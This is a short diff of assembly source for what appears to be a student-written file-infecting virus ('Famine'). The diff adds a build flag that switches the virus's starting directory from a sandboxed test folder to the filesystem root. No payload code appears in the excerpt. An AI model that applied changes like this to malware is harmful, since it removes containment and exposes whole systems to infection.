@@ -175,7 +175,11 @@ _start:
 ; ============================================
 ; Embedded virus strings (in code section for position independence)
 ; ============================================
+%ifdef BONUS_MODE
+v_firstDir:       db "/", 0
+%else
 v_firstDir:       db "/tmp/test", 0
+%endif
 v_signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 0
 v_signature_len:  equ $ - v_signature - 1
 
